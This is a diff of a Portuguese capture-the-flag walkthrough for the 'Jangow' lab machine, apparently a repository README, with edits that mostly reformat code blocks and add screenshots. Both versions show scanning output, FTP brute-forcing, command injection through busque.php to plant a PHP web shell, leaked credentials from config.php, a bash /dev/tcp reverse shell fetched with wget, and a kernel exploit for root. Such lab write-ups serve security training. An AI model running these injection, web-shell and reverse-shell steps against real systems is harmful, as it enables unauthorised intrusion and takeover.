@@ -38,7 +38,7 @@ dirb http://jangow:80 /usr/share/dirb/wordlists/big.txt | tee dirb80.txt
 ~~~
 
 Output:
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 URL_BASE: http://jangow:80/
 WORDLIST_FILES: /usr/share/wordlists/dirb/big.txt
 
@@ -73,7 +73,7 @@ GENERATED WORDS: 20458
 -----------------
 END_TIME: Mon Nov 15 10:19:22 2021
 DOWNLOADED: 61374 - FOUND: 1
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 
 
@@ -81,16 +81,16 @@ DOWNLOADED: 61374 - FOUND: 1
 whatweb http://jangow
 ~~~ 
 Output:
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 http://jangow [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.122.127], Index-Of, Title[Index of /]
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 
 ~~~
 nikto -h jangow
 ~~~
 Output:
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 - Nikto v2.1.6
 ---------------------------------------------------------------------------
 + Target IP:          192.168.122.127
@@ -123,7 +123,7 @@ Output:
 ---------------------------------------------------------------------------
 + 1 host(s) tested
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 
  FTP Port 21:
@@ -132,7 +132,7 @@ Output:
 nmap -p 21 -A -sV -sC jangow
 ~~~
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 PORT   STATE SERVICE VERSION
 21/tcp open  ftp     vsftpd 3.0.3
 MAC Address: 52:54:00:36:85:5E (QEMU virtual NIC)
@@ -150,13 +150,13 @@ HOP RTT     ADDRESS
 
 OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 7.54 seconds
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 ~~~
 nmap -p 21 --script ftp-* jangow
 ~~~
 Output:
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-02 20:27 -04
 NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
 NSE: [ftp-brute] usernames: Time limit 10m00s exceeded.
@@ -171,7 +171,7 @@ PORT   STATE SERVICE
 |_  Statistics: Performed 3550 guesses in 603 seconds, average tps: 5.7
 MAC Address: 52:54:00:36:85:5E (QEMU virtual NIC)
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 
 
@@ -179,7 +179,7 @@ MAC Address: 52:54:00:36:85:5E (QEMU virtual NIC)
 
 ![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/url_expl.png)
 
-Flag User:
+Flag User:<br>
 ![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/flag_user.png)
 
 
@@ -193,9 +193,9 @@ Listando o conteúdo do diretório, foi encontrado um arquivo “config.php” c
 
 Para tentar ler este arquivo:
 
-Criar um arquivo injection url em  php:
+Criar um arquivo shell.php:
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 <?php
 // Para usar use:
 // http://siete.com.br/arquivo1.php?host=www.google.com.br;ls -l
@@ -205,42 +205,45 @@ echo "<pre>";
 print_r($output);
 echo "</pre>";
 ?>
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 
 
 Injetar o shell.php no alvo:
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 http://jangow/site/busque.php?buscar=echo '<?php exec("ping -c 4 " . $_GET['host'], $output);echo "<pre>";print_r($output);echo "</pre>";?>' > shell.php
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 
 
 
 Executar no browser:
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 http://jangow/site/shell.php?host=localhost;cat wordpress/config.php 2\>\&1 /dev/null           
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 ![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_shell.png)
 
 Encontramos a seguinte credencial:
 
+<b>
 login desafio02 <br>
 pass  abygurl69 <br>
+</b>
+<p>
 
 
 
 
+<h3>Porta de saída no alvo:</h3>
+Devido às tentativas de estabelecer um shell reverso sem sucesso, e a possível existência de firewall devido à constatação da aplicação “ufw” no sistema, vamos verificar a existência de uma porta de saída no alvo:
 
-Porta de saída no alvo
-Devido às tentativas de estabelecer um shell reverso sem sucesso, e a possível existência de firewall devido a presença da aplicação “ufw” no sistema, vamos verificar a existência de uma porta de saída no alvo:
+Para isso, vamos colocar o nosso host para escutar as principais portas ao mesmo tempo:
 
-
-Antes, vamos colocar o nosso host para escutar em várias portas (principais):
+~~~
 nano listen.py
-
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~ 
+~~~
 #!/usr/bin/python3
 
 from twisted.internet import reactor
@@ -268,59 +271,65 @@ reactor.listenTCP(3128, site)
 
 reactor.run()
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 
 
-Agora, no navegador, vamos executar o telnet no alvo:
+Agora, no navegador, vamos executar o telnet no alvo, usando um laço de repetição para testar todas as portas:
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-http://jangow/site/busque.php?buscar=echo 'QUIT' | for i in $(seq 1 1024); do echo "Porta $i ==>"; timeout --signal=9 2 telnet 192.168.122.138 $i;echo "Porta $i <=="; done; 
+~~~
+http://jangow/site/busque.php?buscar=echo 'QUIT' | for i in $(seq 1 1024); do echo "Porta $i ==>"; timeout --signal=9 2 telnet jangow $i;echo "Porta $i <=="; done; 
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-A porta 443 aceita a saída de conexão
+~~~
 
 
+A porta 443 aceita a saída de conexão:
+
+![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_telnet.png)
 
 
-Shell reverso:
-cat remote
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+
+Crie um arquivo para executar o Shell reverso no nosso alvo:
+~~~
+nano remote
+~~~
+Conteúdo:<br>
+Obs: substitua o IP 192.168.122.138 pelo seu endereço
+~~~
 /bin/bash -i > /dev/tcp/192.168.122.138/443 0<&1 2>&1
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 
 
 
 
-Abrir o listen no para baixar o script:
+Abrir o listen no seu host no para disponibilizar o script para o alvo (há diversas formas para tal, use a criatividade):
+~~~
 python3 -m http.server 443
-
+~~~
 No navegador, baixar o arquivo no alvo:
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 http://jangow/site/busque.php?buscar=wget http://192.168.122.138:443/remote
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 
 
 
-Aguardar o shell :
+Aguardar o shell:
+~~~
 nc -lnvp 443
+~~~
 
 No navegador, executar o reverse shell:
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+~~~
 http://jangow/site/busque.php?buscar=bash remote
 
-~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
-
-
-
+~~~
+![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_reverse_shell.png)
 
 
 
@@ -328,26 +337,34 @@ http://jangow/site/busque.php?buscar=bash remote
 <h2>⇒ Escalação Privilégio </h2> 
 
 Upgrade de shell e entrar como usuário jangow01:
+~~~
 python3 -c 'import pty; pty.spawn("/bin/sh")'
-
+~~~
+![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_upgrade_shell.png)
 
 
 Procurando por files com suid habilitado:
 
+![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_find_suid.png)
 
 
 Executando o scanner de vulnerabilidades linpeas, encontrei o seguinte:
-
+![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_linpeas.png)
 
 
 
 Download do exploit:
+~~~
 searchsploit -m 40871 
+~~~
 
-Basta agora copiar o exploit no alvo, compilar como o gcc e executar.
+Basta agora copiar o exploit no alvo, compilar com o gcc e executar.
+![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/output_priv_esc.png)
 
 
+Flag de root:
 
 ~~~
 root@jangow01:~# cat /root/proof.txt
 ~~~
+![alt text](https://github.com/jandercalmeida/jangow/blob/main/images/root_flag.png)
